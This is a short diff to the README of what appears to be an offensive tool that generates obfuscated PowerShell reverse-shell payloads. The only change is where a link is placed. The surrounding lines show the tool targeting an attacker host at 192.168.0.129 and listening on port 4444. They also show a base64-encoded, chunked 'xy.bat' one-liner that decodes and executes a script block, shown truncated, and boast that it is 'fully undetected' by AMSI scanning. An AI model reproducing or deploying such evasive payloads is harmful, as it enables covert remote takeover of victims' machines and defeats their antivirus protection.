@@ -60,12 +60,12 @@ Host set to "LukeProuctsKali" (192.168.0.129)
 [*] Successfully exported payload to "xy.bat" with encoding base64 and chunked up 87 times!
 listening on [any] 4444 ...
 ```
-### xy.bat:
+### xy.bat: <a href="https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1">fully undetected AMSI Scan Result</a>
 ```
 powershell /w 1 /C "$a=[scriptblock]::create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZgB1AG4AYwB0AGkAbwBuACAAYwBsAGUAYQBuAHUAcAAgAHsAaQBm'+'ACAAKAAkADMAYwBhADQAYgBhADUANgA2AGMAZgBlAGQANQBjADEAYwA1ADMAMQBmAGQAMgA1ADkAYgBjAGYAMAA5ADcAOAAuAEMAbwBuAG4AZQBjAHQAZQBkACAALQBlAHEAIAAkAHQAcgB1AGUAKQAgAHsAJAAzAGMAYQA0AGIAYQA1ADYANgBjAGYAZQBk'+'ADUAYwAx'+'...')));Invoke-Command -ScriptBlock $a"
 ```
 
-<a href="https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1">fully undetected AMSI Scan Result</a>
+
 
 [![](https://user-images.githubusercontent.com/73026669/150165109-71b9f841-3b8e-42bd-a502-5d666244eaaf.png)](https://www.virustotal.com/gui/file/2fc4ec778c03a989fd74fa878617dc22e7efc35e8d906b51af611562d1b0b418?nocache=1)
 
